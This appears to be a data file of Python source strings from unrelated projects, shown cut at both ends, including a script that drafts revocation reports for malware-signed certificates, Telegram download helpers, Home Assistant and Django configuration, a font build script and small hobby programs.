     \"We identified a malware signed with an \" + issuer_cn + \" certificate. \\n\" \n            \"The malware sample is available on MalwareBazaar here: https://bazaar.abuse.ch/sample/\" + args.hash + \"\\n\"\\\n            \"Here are the signature details:\\n\"\\\n                \"Name: \" + subject_cn + \"\\n\"\n                \"Issuer: \" + issuer_cn + \"\\n\"\n                \"Serial Number: \" + serial_number + \"\\n\"\n                \"SHA256 Thumbprint: \" + thumbprint + \"\\n\"\n                \"\\n\"\n                \"The malware was tagged as \" + tag_string + \".\"\n                \"\\n\"\n                \"MalwareBazaar submitted the file to multiple public sandboxes, the links to the sandbox results are below:\\n\"\n                \"Sandbox\\t / Malware Family\\t /  Verdict\\t / Analysis URL\"\n                )\n                \n        for key, value in vendor_intel_dict.items():\n            if key == 'ANY.RUN':\n                print(f\"{key} \\t {value[0]['malware_family']}\\t {value[0]['verdict']}\\t {value[0]['analysis_url']}\")\n            elif key == 'Triage':\n                print(f\"{key} \\t {value['malware_family']} \\t {value['score']} / 10\\t {value['link']} \")\n            elif key == 'Intezer':\n                print(f\"{key} \\t {value['family_name']} \\t {value['verdict']} \\t {value['analysis_url']} \")\n            elif key == 'VMRay':\n                print(f\"{key} \\t {value['malware_family']} \\t {value['verdict']} \\t {value['report_link']} \")\n        \n        print(\"\")\n        print(\"Please let us know if you have any questions.\")\n        print(\"------------------------\")\n        print('''Send the above message to the certificate provider. ''')\n        if \"SSL\" in issuer_cn:\n            print(\"This report should be sent to SSL.com: https://ssl.com/revoke\")\n        elif \"Certum\" in issuer_cn:\n            print(\"This report should be sent to Certum PL: ccp@certum.pl\")\n        elif \"Digicert\" in issuer_cn:\n            print(\"This report should be sent to Digicert: Revoke@digicert.com\")\n        elif \"GlobalSign\" in issuer_cn:\n            print(\"This report should be sent to GlobalSign: report-abuse@globalsign.com\")\n        elif \"Sectigo\" in issuer_cn:\n            print(\"This report should be sent to Sectigo: signedmalwarealert@sectigo.com\")\n        elif \"Entrust\" in issuer_cn:\n            print(\"This report should be sent to Entrust: ecs.support@entrust.com\")\n        else:\n            print(\"Assuming this is a valid certificate. Search the provider's website for the reporting email.\")\n\n\n        \n    \n            \nif __name__==\"__main__\":\n    main()\n",
    "import os\nimport time\nimport datetime\nimport aiohttp\nimport aiofiles\nimport asyncio\nimport logging\nimport requests\nimport tgcrypto\nimport subprocess\nimport concurrent.futures\n\nfrom utils import progress_bar\n\nfrom pyrogram import Client, filters\nfrom pyrogram.types import Message\n\n\n\ndef duration(filename):\n    result = subprocess.run([\"ffprobe\", \"-v\", \"error\", \"-show_entries\",\n                             \"format=duration\", \"-of\",\n                             \"default=noprint_wrappers=1:nokey=1\", filename],\n        stdout=subprocess.PIPE,\n        stderr=subprocess.STDOUT)\n    return float(result.stdout)\n    \ndef exec(cmd):\n        process = subprocess.run(cmd, stdout=subprocess.PIPE,stderr=subprocess.PIPE)\n        output = process.stdout.decode()\n        print(output)\n        return output\n        #err = process.stdout.decode()\ndef pull_run(work, cmds):\n    with concurrent.futures.ThreadPoolExecutor(max_workers=work) as executor:\n        print(\"Waiting for tasks to complete\")\n        fut = executor.map(exec,cmds)\nasync def aio(url,name):\n    k = f'{name}.pdf'\n    async with aiohttp.ClientSession() as session:\n        async with session.get(url) as resp:\n            if resp.status == 200:\n                f = await aiofiles.open(k, mode='wb')\n                await f.write(await resp.read())\n                await f.close()\n    return k\n\n\nasync def download(url,name):\n    ka = f'{name}.pdf'\n    async with aiohttp.ClientSession() as session:\n        async with session.get(url) as resp:\n            if resp.status == 200:\n                f = await aiofiles.open(ka, mode='wb')\n                await f.write(await resp.read())\n                await f.close()\n    return ka\n\n\n\ndef parse_vid_info(info):\n    info = info.strip()\n    info = info.split(\"\\n\")\n    new_info = []\n    temp = []\n    for i in info:\n        i = str(i)\n        if \"[\" not in i and '---' not in i:\n            while \"  \" in i:\n                i = i.replace(\"  \", \" \")\n            i.strip()\n            i = i.split(\"|\")[0].split(\" \",2)\n            try:\n                if \"RESOLUTION\" not in i[2] and i[2] not in temp and \"audio\" not in i[2]:\n                    temp.append(i[2])\n                    new_info.append((i[0], i[2]))\n            except:\n                pass\n    return new_info\n\n\ndef vid_info(info):\n    info = info.strip()\n    info = info.split(\"\\n\")\n    new_info = dict()\n    temp = []\n    for i in info:\n        i = str(i)\n        if \"[\" not in i and '---' not in i:\n            while \"  \" in i:\n                i = i.replace(\"  \", \" \")\n            i.strip()\n            i = i.split(\"|\")[0].split(\" \",3)\n            try:\n                if \"RESOLUTION\" not in i[2] and i[2] not in temp and \"audio\" not in i[2]:\n                    temp.append(i[2])\n                    \n                    # temp.update(f'{i[2]}')\n                    # new_info.append((i[2], i[0]))\n                    #  mp4,mkv etc ==== f\"({i[1]})\" \n                    \n                    new_info.update({f'{i[2]}':f'{i[0]}'})\n\n            except:\n                pass\n    return new_info\n\n\n\nasync def run(cmd):\n    proc = await asyncio.create_subprocess_shell(\n        cmd,\n        stdout=asyncio.subprocess.PIPE,\n        stderr=asyncio.subprocess.PIPE)\n\n    stdout, stderr = await proc.communicate()\n\n    print(f'[{cmd!r} exited with {proc.returncode}]')\n    if proc.returncode == 1:\n        return False\n    if stdout:\n        return f'[stdout]\\n{stdout.decode()}'\n    if stderr:\n        return f'[stderr]\\n{stderr.decode()}'\n\n    \n\ndef old_download(url, file_name, chunk_size = 1024 * 10):\n    if os.path.exists(file_name):\n        os.remove(file_name)\n    r = requests.get(url, allow_redirects=True, stream=True)\n    with open(file_name, 'wb') as fd:\n        for chunk in r.iter_content(chunk_size=chunk_size):\n            if chunk:\n                fd.write(chunk)\n    return file_name\n\n\ndef human_readable_size(size, decimal_places=2):\n    for unit in ['B', 'KB', 'MB', 'GB', 'TB', 'PB']:\n        if size < 1024.0 or unit == 'PB':\n            break\n        size /= 1024.0\n    return f\"{size:.{decimal_places}f} {unit}\"\n\n\ndef time_name():\n    date = datetime.date.today()\n    now = datetime.datetime.now()\n    current_time = now.strftime(\"%H%M%S\")\n    return f\"{date} {current_time}.mp4\"\n\n\nasync def download_video(url,cmd, name):\n    download_cmd = f'{cmd} -R 25 --fragment-retries 25 --external-downloader aria2c --downloader-args \"aria2c: -x 16 -j 32\"'\n    global failed_counter\n    print(download_cmd)\n    logging.info(download_cmd)\n    k = subprocess.run(download_cmd, shell=True)\n    if \"visionias\" in cmd and k.returncode != 0 and failed_counter <= 10:\n        failed_counter += 1\n        await asyncio.sleep(5)\n        await download_video(url, cmd, name)\n    failed_counter = 0\n    try:\n        if os.path.isfile(name):\n            return name\n        elif os.path.isfile(f\"{name}.webm\"):\n            return f\"{name}.webm\"\n        name = name.split(\".\")[0]\n        if os.path.isfile(f\"{name}.mkv\"):\n           ",
    "\"\"\"Sensor for Yoto integration.\"\"\"\n\nfrom __future__ import annotations\n\nimport logging\nfrom typing import Final\n\nfrom yoto_api import YotoPlayer\n\nfrom homeassistant.components.sensor import (\n    SensorDeviceClass,\n    SensorEntity,\n    SensorEntityDescription,\n    SensorStateClass,\n)\n\nfrom homeassistant.config_entries import ConfigEntry\nfrom homeassistant.core import HomeAssistant\nfrom homeassistant.helpers.entity_platform import AddEntitiesCallback\n\nfrom homeassistant.const import PERCENTAGE, TEMP_CELSIUS\n\nfrom .const import DOMAIN\nfrom .entity import YotoEntity\n\n_LOGGER = logging.getLogger(__name__)\n\nSENSOR_DESCRIPTIONS: Final[tuple[SensorEntityDescription, ...]] = (\n    SensorEntityDescription(\n        key=\"last_updated_at\",\n        name=\"Last Updated At\",\n        icon=\"mdi:update\",\n        device_class=SensorDeviceClass.TIMESTAMP,\n    ),\n    SensorEntityDescription(\n        key=\"battery_level_percentage\",\n        name=\"Battery Level\",\n        icon=\"mdi:battery\",\n        native_unit_of_measurement=PERCENTAGE,\n        state_class=SensorStateClass.MEASUREMENT,\n    ),\n    SensorEntityDescription(\n        key=\"temperature_celcius\",\n        name=\"Temperature\",\n        native_unit_of_measurement=TEMP_CELSIUS,\n        device_class=SensorDeviceClass.TEMPERATURE,\n    ),\n    SensorEntityDescription(\n        key=\"ambient_light_sensor_reading\",\n        name=\"Ambient Light Reading\",\n    ),\n    SensorEntityDescription(\n        key=\"wifi_strength\",\n        name=\"WiFi Signal Strength\",\n    ),\n    SensorEntityDescription(\n        key=\"night_light_mode\",\n        name=\"Night Light Status\",\n    ),\n)\n\n\nasync def async_setup_entry(\n    hass: HomeAssistant,\n    config_entry: ConfigEntry,\n    async_add_entities: AddEntitiesCallback,\n) -> None:\n    \"\"\"Set up sensor platform.\"\"\"\n    coordinator = hass.data[DOMAIN][config_entry.unique_id]\n    entities = []\n    for player_id in coordinator.yoto_manager.players.keys():\n        player: YotoPlayer = coordinator.yoto_manager.players[player_id]\n        for description in SENSOR_DESCRIPTIONS:\n            if getattr(player, description.key, None) is not None:\n                entities.append(YotoSensor(coordinator, description, player))\n    async_add_entities(entities)\n    return True\n\n\nclass YotoSensor(SensorEntity, YotoEntity):\n    \"\"\"Yoto sensor class.\"\"\"\n\n    def __init__(\n        self, coordinator, description: SensorEntityDescription, player: YotoPlayer\n    ):\n        \"\"\"Initialize the sensor.\"\"\"\n        super().__init__(coordinator, player)\n        self._description = description\n        self._key = self._description.key\n        self._attr_unique_id = f\"{DOMAIN}_{player.id}_{self._key}\"\n        self._attr_icon = self._description.icon\n        self._attr_name = f\"{player.name} {self._description.name}\"\n        self._attr_state_class = self._description.state_class\n        self._attr_device_class = self._description.device_class\n\n    @property\n    def native_value(self):\n        \"\"\"Return the value reported by the sensor.\"\"\"\n        return getattr(self.player, self._key)\n",
    "\"\"\"\nDjango settings for hello_world project.\n\nGenerated by 'django-admin startproject' using Django 4.2.11.\n\nFor more information on this file, see\nhttps://docs.djangoproject.com/en/4.2/topics/settings/\n\nFor the full list of settings and their values, see\nhttps://docs.djangoproject.com/en/4.2/ref/settings/\n\"\"\"\n\nimport os\nfrom pathlib import Path\nfrom dotenv import load_dotenv\n\nload_dotenv()\n\n# Build paths inside the project like this: BASE_DIR / 'subdir'.\nBASE_DIR = Path(__file__).resolve().parent.parent\n\n\n# Quick-start development settings - unsuitable for production\n# See https://docs.djangoproject.com/en/4.2/howto/deployment/checklist/\n\n# SECURITY WARNING: keep the secret key used in production secret!\nSECRET_KEY = os.getenv(\"SECRET_KEY\")\n\n# SECURITY WARNING: don't run with debug turned on in production!\nDEBUG = os.getenv(\"DEBUG\")\n\nALLOWED_HOSTS = os.getenv('ALLOWED_HOSTS', '').split(',')\n\nif 'CODESPACE_NAME' in os.environ:\n    codespace_name = os.getenv(\"CODESPACE_NAME\")\n    codespace_domain = os.getenv(\"GITHUB_CODESPACES_PORT_FORWARDING_DOMAIN\")\n    CSRF_TRUSTED_ORIGINS = [f'https://{codespace_name}-8000.{codespace_domain}']\n\n# Application definition\n\nINSTALLED_APPS = [\n    \"django.contrib.admin\",\n    \"django.contrib.auth\",\n    \"django.contrib.contenttypes\",\n    \"django.contrib.sessions\",\n    \"django.contrib.messages\",\n    \"django.contrib.staticfiles\",\n    \"django_browser_reload\",\n]\n\nMIDDLEWARE = [\n    \"django.middleware.security.SecurityMiddleware\",\n    \"django.contrib.sessions.middleware.SessionMiddleware\",\n    \"django.middleware.common.CommonMiddleware\",\n    \"django.middleware.csrf.CsrfViewMiddleware\",\n    \"django.contrib.auth.middleware.AuthenticationMiddleware\",\n    \"django.contrib.messages.middleware.MessageMiddleware\",\n    \"django.middleware.clickjacking.XFrameOptionsMiddleware\",\n    \"django_browser_reload.middleware.BrowserReloadMiddleware\",\n]\n\nX_FRAME_OPTIONS = \"ALLOW-FROM preview.app.github.dev\"\n\nROOT_URLCONF = \"hello_world.urls\"\n\nTEMPLATES = [\n    {\n        \"BACKEND\": \"django.template.backends.django.DjangoTemplates\",\n        \"DIRS\": [BASE_DIR / \"hello_world\" / \"templates\"],\n        \"APP_DIRS\": True,\n        \"OPTIONS\": {\n            \"context_processors\": [\n                \"django.template.context_processors.debug\",\n                \"django.template.context_processors.request\",\n                \"django.contrib.auth.context_processors.auth\",\n                \"django.contrib.messages.context_processors.messages\",\n            ],\n        },\n    },\n]\n\nWSGI_APPLICATION = \"hello_world.wsgi.application\"\n\n\n# Database\n# https://docs.djangoproject.com/en/4.2/ref/settings/#databases\n\nDATABASES = {\n    \"default\": {\n        \"ENGINE\": \"django.db.backends.sqlite3\",\n        \"NAME\": BASE_DIR / \"db.sqlite3\",\n    }\n}\n\n\n# Password validation\n# https://docs.djangoproject.com/en/4.2/ref/settings/#auth-password-validators\n\nAUTH_PASSWORD_VALIDATORS = [\n    {\n        \"NAME\": \"django.contrib.auth.password_validation.UserAttributeSimilarityValidator\",\n    },\n    {\n        \"NAME\": \"django.contrib.auth.password_validation.MinimumLengthValidator\",\n    },\n    {\n        \"NAME\": \"django.contrib.auth.password_validation.CommonPasswordValidator\",\n    },\n    {\n        \"NAME\": \"django.contrib.auth.password_validation.NumericPasswordValidator\",\n    },\n]\n\n\n# Internationalization\n# https://docs.djangoproject.com/en/4.2/topics/i18n/\n\nLANGUAGE_CODE = \"en-us\"\n\nTIME_ZONE = \"UTC\"\n\nUSE_I18N = True\n\nUSE_TZ = True\n\n\n# Static files (CSS, JavaScript, Images)\n# https://docs.djangoproject.com/en/4.2/howto/static-files/\n\nSTATICFILES_DIRS = [\n    BASE_DIR / \"hello_world\" / \"static\",\n]\n\nSTATIC_URL = \"static/\"\nSTATIC_ROOT = BASE_DIR / \"hello_world\" / \"staticfiles\"\n\nMEDIA_URL = \"media/\"\nMEDIA_ROOT = BASE_DIR / \"hello_world\" / \"media\"\n\n\n# Default primary key field type\n# https://docs.djangoproject.com/en/4.2/ref/settings/#default-auto-field\n\nDEFAULT_AUTO_FIELD = \"django.db.models.BigAutoField\"\n",
    "import logging\nimport subprocess\nfrom pathlib import Path\nfrom shutil import rmtree\n\nfrom smart_contracts.helpers.util import find_app_spec_file\n\nlogger = logging.getLogger(__name__)\ndeployment_extension = \"py\"\n\n\ndef build(output_dir: Path, contract_path: Path) -> Path:\n    output_dir = output_dir.resolve()\n    if output_dir.exists():\n        rmtree(output_dir)\n    output_dir.mkdir(exist_ok=True, parents=True)\n    logger.info(f\"Exporting {contract_path} to {output_dir}\")\n\n    build_result = subprocess.run(\n        [\n            \"algokit\",\n            \"--no-color\",\n            \"compile\",\n            \"python\",\n            contract_path.absolute(),\n            f\"--out-dir={output_dir}\",\n            \"--output-arc32\",\n        ],\n        stdout=subprocess.PIPE,\n        stderr=subprocess.STDOUT,\n        text=True,\n    )\n    if build_result.returncode:\n        raise Exception(f\"Could not build contract:\\n{build_result.stdout}\")\n\n    app_spec_file_name = find_app_spec_file(output_dir)\n    if app_spec_file_name is None:\n        raise Exception(\"Could not generate typed client, .arc32.json file not found\")\n\n    generate_result = subprocess.run(\n        [\n            \"algokit\",\n            \"generate\",\n            \"client\",\n            output_dir / app_spec_file_name,\n            \"--output\",\n            output_dir / f\"client.{deployment_extension}\",\n        ],\n        stdout=subprocess.PIPE,\n        stderr=subprocess.STDOUT,\n        text=True,\n    )\n    if generate_result.returncode:\n        if \"No such command\" in generate_result.stdout:\n            raise Exception(\n                \"Could not generate typed client, requires AlgoKit 1.1 or \"\n                \"later. Please update AlgoKit\"\n            )\n        else:\n            raise Exception(\n                f\"Could not generate typed client:\\n{generate_result.stdout}\"\n            )\n    return output_dir / app_spec_file_name\n",
    "from aima3.logic import *\n\nkb = FolKB()\n\n# Define fields of study\nfields = [\n    {\"name\": \"Computer Science\", \"type\": \"Science\", \"interest\": \"High\", \"job_prospects\": \"High\", \"high_school\": \"Scientific\"},\n    {\"name\": \"Computer Engineering\", \"type\": \"Engineering\", \"interest\": \"High\", \"job_prospects\": \"High\", \"high_school\": \"Scientific\"},\n    {\"name\": \"Mechanical Engineering\", \"type\": \"Engineering\", \"interest\": \"Medium\", \"job_prospects\": \"High\", \"high_school\": \"Scientific\"},\n    {\"name\": \"Psychology\", \"type\": \"Social Science\", \"interest\": \"High\", \"job_prospects\": \"Medium\", \"high_school\": \"Literary\"},\n    {\"name\": \"Economics\", \"type\": \"Social Science\", \"interest\": \"Medium\", \"job_prospects\": \"High\", \"high_school\": \"Scientific\"},\n    {\"name\": \"Art History\", \"type\": \"Humanities\", \"interest\": \"Low\", \"job_prospects\": \"Low\", \"high_school\": \"Literary\"},\n    {\"name\": \"Biology\", \"type\": \"Science\", \"interest\": \"High\", \"job_prospects\": \"Medium\", \"high_school\": \"Scientific\"},\n    {\"name\": \"History\", \"type\": \"Humanities\", \"interest\": \"Medium\", \"job_prospects\": \"Low\", \"high_school\": \"Literary\"},\n    {\"name\": \"Physics\", \"type\": \"Science\", \"interest\": \"High\", \"job_prospects\": \"Medium\", \"high_school\": \"Scientific\"},\n    {\"name\": \"Political Science\", \"type\": \"Social Science\", \"interest\": \"Medium\", \"job_prospects\": \"Medium\", \"high_school\": \"Literary\"},\n    {\"name\": \"Mathematics\", \"type\": \"Science\", \"interest\": \"High\", \"job_prospects\": \"High\", \"high_school\": \"Scientific\"},\n    {\"name\": \"Chemistry\", \"type\": \"Science\", \"interest\": \"High\", \"job_prospects\": \"Medium\", \"high_school\": \"Scientific\"},\n    {\"name\": \"Philosophy\", \"type\": \"Humanities\", \"interest\": \"Medium\", \"job_prospects\": \"Low\", \"high_school\": \"Literary\"},\n    {\"name\": \"Sociology\", \"type\": \"Social Science\", \"interest\": \"Medium\", \"job_prospects\": \"Medium\", \"high_school\": \"Literary\"},\n    {\"name\": \"Anthropology\", \"type\": \"Social Science\", \"interest\": \"Medium\", \"job_prospects\": \"Low\", \"high_school\": \"Literary\"},\n    {\"name\": \"Geology\", \"type\": \"Science\", \"interest\": \"Medium\", \"job_prospects\": \"Medium\", \"high_school\": \"Scientific\"},\n    {\"name\": \"Linguistics\", \"type\": \"Humanities\", \"interest\": \"Medium\", \"job_prospects\": \"Low\", \"high_school\": \"Literary\"},\n    {\"name\": \"Astronomy\", \"type\": \"Science\", \"interest\": \"High\", \"job_prospects\": \"Medium\", \"high_school\": \"Scientific\"},\n]\n\n# Add fields of study to the knowledge base\nfor field in fields:\n    kb.tell(expr(f'Field(\"{field[\"name\"]}\")'))\n    kb.tell(expr(f'Type(\"{field[\"name\"]}\", \"{field[\"type\"]}\")'))\n    kb.tell(expr(f'Interest(\"{field[\"name\"]}\", \"{field[\"interest\"]}\")'))\n    kb.tell(expr(f'JobProspects(\"{field[\"name\"]}\", \"{field[\"job_prospects\"]}\")'))\n    kb.tell(expr(f'HighSchool(\"{field[\"name\"]}\", \"{field[\"high_school\"]}\")'))\n\n\n# Rules and Preferences\nkb.tell(expr('PreferredField(Me, x) & Field(x) ==> RecommendField(x, Me)'))\nkb.tell(expr('PreferredJobProspects(Me, y) & JobProspects(x, y) ==> RecommendField(x, Me)'))\nkb.tell(expr('PreferredHighSchool(Me, z) & HighSchool(x, z) ==> RecommendField(x, Me)'))\nkb.tell(expr('PreferredType(Me, w) & Type(x, w) ==> RecommendField(x, Me)'))\nkb.tell(expr('PreferField(Me, x) ==> RecommendField(x, Me)')) \nkb.tell(expr('PreferField(Me, x) & PreferredType(Me, Type(x)) ==> RecommendField(x, Me)'))\nkb.tell(expr('PreferField(Me, x) & Interest(x, \"Low\") ==> Not(RecommendField(x, Me))'))\nkb.tell(expr('PreferField(Me, x) & PreferredJobProspects(Me, \"High\") & JobProspects(x, \"High\") & Interest(x, \"High\") ==> RecommendField(x, Me)'))\nkb.tell(expr('PreferField(Me, x) & Interest(x, \"Medium\") & Not(Interest(x, \"High\")) ==> RecommendField(x, Me)'))\nkb.tell(expr('PreferField(Me, x) & Interest(x, \"High\") ==> RecommendField(x, Me)'))\nkb.tell(expr('PreferField(Me, x) & PreferField(Me, y) & Interest(x, \"High\") & Interest(y, \"Medium\") ==> RecommendField(x, Me)'))\nkb.tell(expr('PreferField(Me, x) & PreferField(Me, y) & Interest(x, \"Medium\") & Interest(y, \"Low\") ==> RecommendField(x, Me)'))\n\n",
    "import constants as c\nfrom primitives import Pose\n\n\nclass CombatantCollection:\n    GRANULARITY = 150\n\n    def __init__(self):\n        self.combatants = []\n        self.buckets = {}\n        x = 0\n        while x < c.ARENA_WIDTH:\n            x += self.GRANULARITY\n            y = 0\n            while y < c.ARENA_HEIGHT:\n                y += self.GRANULARITY\n                self.buckets[(x, y)] = CombatantCollection.Bucket()\n\n    def pose_to_bucket_key(self, pose):\n        x = int(pose.x//self.GRANULARITY*self.GRANULARITY + self.GRANULARITY)\n        y = int(pose.y//self.GRANULARITY*self.GRANULARITY + self.GRANULARITY)\n        return x, y\n\n    def pose_to_bucket(self, pose):\n        x, y = self.pose_to_bucket_key(pose)\n        if (x, y) not in self.buckets:\n            return None\n        return self.buckets[(x, y)]\n\n    def add(self, combatant):\n        self.combatants += [combatant]\n        bucket = self.pose_to_bucket(combatant.position)\n        bucket.add(combatant)\n\n    def check_switched_buckets(self, combatant, old_pose):\n        new_pose = combatant.position\n        if self.pose_to_bucket(old_pose) != self.pose_to_bucket(new_pose):\n            if self.pose_to_bucket(old_pose):\n                self.pose_to_bucket(old_pose).remove(combatant)\n            if self.pose_to_bucket(new_pose):\n                self.pose_to_bucket(new_pose).add(combatant)\n\n    def add_multiple(self, enumerable):\n        for combatant in enumerable:\n            self.add(combatant)\n\n    def get_nearby_combatants(self, pose, tribe_to_exclude=None):\n        combatants = set()\n        for xoffset in (-2*self.GRANULARITY, self.GRANULARITY, 0, self.GRANULARITY, 2*self.GRANULARITY):\n            for yoffset in (-2*self.GRANULARITY, self.GRANULARITY, 0, self.GRANULARITY, 2*self.GRANULARITY):\n                bucket = self.pose_to_bucket(pose + Pose((xoffset, yoffset)))\n                if bucket == None:\n                    continue\n                combatants = combatants.union(bucket.combatants)\n        combatants_list = [combatant for combatant in combatants if combatant.tribe != tribe_to_exclude and not combatant.destroyed]\n        combatants_list.sort(key=lambda x: (x.position - pose).magnitude())\n        return combatants_list\n\n    def __iter__(self):\n        for combatant in self.combatants:\n            yield combatant\n\n    def sort(self, key):\n        self.combatants.sort(key=key)\n\n    def update(self, dt, events):\n        for combatant in self.combatants[:]:\n            combatant.update(dt, events)\n            if combatant.destroyed and not len(combatant.particles):\n                self.combatants.remove(combatant)\n\n    def draw(self, surface, offset=(0, 0)):\n        self.combatants.sort(key=lambda x: x.sort_value())\n        for combatant in self.combatants:\n            combatant.draw(surface, offset)\n\n    class Bucket():\n        def __init__(self):\n            self.combatants = set()\n\n        def add(self, combatant):\n            self.combatants.add(combatant)\n\n        def remove(self, combatant):\n            self.combatants.remove(combatant)\n\n        def __repr__(self):\n            return f\"{len(self.combatants)}\"",
    "import RPi.GPIO as GPIO\r\nimport time \r\n\r\nout1 = 13\r\nout2 = 11\r\nout3 = 15\r\nout4 = 12\r\n\r\ni=0\r\npositive=0\r\nnegative=0\r\ny=0\r\n\r\nGPIO.setmode(GPIO.BOARD)\r\nGPIO.setup(out1,GPIO.OUT)\r\nGPIO.setup(out2,GPIO.OUT)\r\nGPIO.setup(out3,GPIO.OUT)\r\nGPIO.setup(out4,GPIO.OUT)\r\n\r\nprint (\"calibrating by +ve and -ve values.....\")\r\n\r\ntry:\r\n   while(1):\r\n      GPIO.output(out1,GPIO.LOW)\r\n      GPIO.output(out2,GPIO.LOW)\r\n      GPIO.output(out3,GPIO.LOW)\r\n      GPIO.output(out4,GPIO.LOW)\r\n      x = input()\r\n      if x>0 and x<=400:\r\n          for y in range(x,0,-1):\r\n              if negative==1:\r\n                  if i==7:\r\n                      i=0\r\n                  else:\r\n                      i=i+1\r\n                  y=y+2\r\n                  negative=0\r\n              positive=1\r\n              #print((x+1)-y)\r\n              if i==0:\r\n                  GPIO.output(out1,GPIO.HIGH)\r\n                  GPIO.output(out2,GPIO.LOW)\r\n                  GPIO.output(out3,GPIO.LOW)\r\n                  GPIO.output(out4,GPIO.LOW)\r\n                  time.sleep(0.03)\r\n                  #time.sleep(1)\r\n              elif i==1:\r\n                  GPIO.output(out1,GPIO.HIGH)\r\n                  GPIO.output(out2,GPIO.HIGH)\r\n                  GPIO.output(out3,GPIO.LOW)\r\n                  GPIO.output(out4,GPIO.LOW)\r\n                  time.sleep(0.03)\r\n                  #time.sleep(1)\r\n              elif i==2:  \r\n                  GPIO.output(out1,GPIO.LOW)\r\n                  GPIO.output(out2,GPIO.HIGH)\r\n                  GPIO.output(out3,GPIO.LOW)\r\n                  GPIO.output(out4,GPIO.LOW)\r\n                  time.sleep(0.03)\r\n                  #time.sleep(1)\r\n              elif i==3:    \r\n                  GPIO.output(out1,GPIO.LOW)\r\n                  GPIO.output(out2,GPIO.HIGH)\r\n                  GPIO.output(out3,GPIO.HIGH)\r\n                  GPIO.output(out4,GPIO.LOW)\r\n                  time.sleep(0.03)\r\n                  #time.sleep(1)\r\n              elif i==4:  \r\n                  GPIO.output(out1,GPIO.LOW)\r\n                  GPIO.output(out2,GPIO.LOW)\r\n                  GPIO.output(out3,GPIO.HIGH)\r\n                  GPIO.output(out4,GPIO.LOW)\r\n                  time.sleep(0.03)\r\n                  #time.sleep(1)\r\n              elif i==5:\r\n                  GPIO.output(out1,GPIO.LOW)\r\n                  GPIO.output(out2,GPIO.LOW)\r\n                  GPIO.output(out3,GPIO.HIGH)\r\n                  GPIO.output(out4,GPIO.HIGH)\r\n                  time.sleep(0.03)\r\n                  #time.sleep(1)\r\n              elif i==6:    \r\n                  GPIO.output(out1,GPIO.LOW)\r\n                  GPIO.output(out2,GPIO.LOW)\r\n                  GPIO.output(out3,GPIO.LOW)\r\n                  GPIO.output(out4,GPIO.HIGH)\r\n                  time.sleep(0.03)\r\n                  #time.sleep(1)\r\n              elif i==7:    \r\n                  GPIO.output(out1,GPIO.HIGH)\r\n                  GPIO.output(out2,GPIO.LOW)\r\n                  GPIO.output(out3,GPIO.LOW)\r\n                  GPIO.output(out4,GPIO.HIGH)\r\n                  time.sleep(0.03)\r\n                  #time.sleep(1)\r\n              if i==7:\r\n                  i=0\r\n                  continue\r\n              i=i+1\r\n          \r\n      elif x<0 and x>=-400:\r\n          x=x*-1\r\n          for y in range(x,0,-1):\r\n              if positive==1:\r\n                  if i==0:\r\n                      i=7\r\n                  else:\r\n                      i=i-1\r\n                  y=y+3\r\n                  positive=0\r\n              negative=1\r\n              #print((x+1)-y) \r\n              if i==0:\r\n                  GPIO.output(out1,GPIO.HIGH)\r\n                  GPIO.output(out2,GPIO.LOW)\r\n                  GPIO.output(out3,GPIO.LOW)\r\n                  GPIO.output(out4,GPIO.LOW)\r\n                  time.sleep(0.03)\r\n                  #time.sleep(1)\r\n              elif i==1:\r\n                  GPIO.output(out1,GPIO.HIGH)\r\n                  GPIO.output(out2,GPIO.HIGH)\r\n                  GPIO.output(out3,GPIO.LOW)\r\n                  GPIO.output(out4,GPIO.LOW)\r\n                  time.sleep(0.03)\r\n                  #time.sleep(1)\r\n              elif i==2:  \r\n                  GPIO.output(out1,GPIO.LOW)\r\n                  GPIO.output(out2,GPIO.HIGH)\r\n                  GPIO.output(out3,GPIO.LOW)\r\n                  GPIO.output(out4,GPIO.LOW)\r\n                  time.sleep(0.03)\r\n                  #time.sleep(1)\r\n              elif i==3:    \r\n                  GPIO.output(out1,GPIO.LOW)\r\n                  GPIO.output(out2,GPIO.HIGH)\r\n                  GPIO.output(out3,GPIO.HIGH)\r\n                  GPIO.output(out4,GPIO.LOW)\r\n                  time.sleep(0.03)\r\n                  #time.sleep(1)\r\n              elif i==4:  \r\n                  GPIO.output(out1,GPIO.LOW)\r\n                  GPIO.output(out2,GPIO.LOW)\r\n                  GPIO.output(out3,GPIO.HIGH)\r\n                  GPIO.output(out4,GPIO.LOW)\r\n                  time.sleep(0.03)\r\n                  #time.sleep(1)\r\n              elif i==5:\r\n                  GPIO.output(out1,GPIO.LOW)\r\n       ",
    "#!/usr/bin/env python\n# coding=utf-8\n#\n# build.py - Amiri font build utility\n#\n# Copyright 2010-2022 Khaled Hosny <khaled@aliftype.com>\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\n\ndef generateFont(font, options):\n    from ufo2ft import compileOTF, compileTTF\n\n    makeOverLine(font)\n\n    info = font.info\n    major, minor = options.version.split(\".\")\n    info.versionMajor, info.versionMinor = int(major), int(minor)\n\n    if options.output.endswith(\".ttf\"):\n        otf = compileTTF(\n            font,\n            inplace=True,\n            removeOverlaps=True,\n            overlapsBackend=\"pathops\",\n        )\n    else:\n        otf = compileOTF(\n            font,\n            inplace=True,\n            optimizeCFF=1,\n            removeOverlaps=True,\n            overlapsBackend=\"pathops\",\n        )\n\n    return otf\n\n\ndef drawOverline(font, name, pos, thickness, width):\n    try:\n        glyph = font[name]\n    except KeyError:\n        glyph = font.newGlyph(name)\n        glyph.width = 0\n\n    pen = glyph.getPen()\n    glyph.clear()\n\n    pen.moveTo((-50, pos))\n    pen.lineTo((-50, pos + thickness))\n    pen.lineTo((width + 50, pos + thickness))\n    pen.lineTo((width + 50, pos))\n    pen.closePath()\n\n    return glyph\n\n\ndef makeOverLine(font):\n    from fontTools.feaLib import ast\n\n    base = \"overlinecomb\"\n    pos = font[base].getBounds(font).yMax\n    thickness = font.info.postscriptUnderlineThickness\n    min_width = 100\n\n    # collect glyphs grouped by their widths rounded by 100 units, we will use\n    # them to decide the widths of over/underline glyphs we will draw\n    widths = {}\n    for glyph in font:\n        u = glyph.unicode\n        if (\n            (u is None) or (0x0600 <= u <= 0x06FF) or u == ord(\" \")\n        ) and 